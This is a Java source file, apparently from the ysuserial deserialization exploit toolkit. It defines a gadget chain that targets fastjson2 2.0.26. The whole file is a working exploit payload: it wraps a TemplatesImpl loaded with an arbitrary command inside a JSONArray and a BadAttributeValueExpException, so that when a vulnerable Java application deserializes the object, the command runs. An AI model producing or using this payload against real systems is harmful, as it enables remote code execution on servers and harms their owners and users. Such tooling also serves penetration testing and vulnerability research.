package org.su18.ysuserial.payloads.gadgets;

import com.alibaba.fastjson2.JSONArray;
import org.su18.ysuserial.payloads.ObjectPayload;
import org.su18.ysuserial.payloads.annotation.Authors;
import org.su18.ysuserial.payloads.annotation.Dependencies;
import org.su18.ysuserial.payloads.util.Gadgets;
import org.su18.ysuserial.payloads.util.Reflections;

import javax.management.BadAttributeValueExpException;

/**
 * @author su18
 */
@Dependencies({"com.alibaba.fastjson2:fastjson2:2.0.26"})
@Authors({"Y4tacker"})
public class Fastjson2 implements ObjectPayload {

	public Object getObject(final String command) throws Exception {
		final Object templates = Gadgets.createTemplatesImpl(command);

		JSONArray jsonArray = new JSONArray();
		jsonArray.add(templates);

		BadAttributeValueExpException val = new BadAttributeValueExpException(null);

		Reflections.setFieldValue(val, "val", jsonArray);
		return val;
	}

}
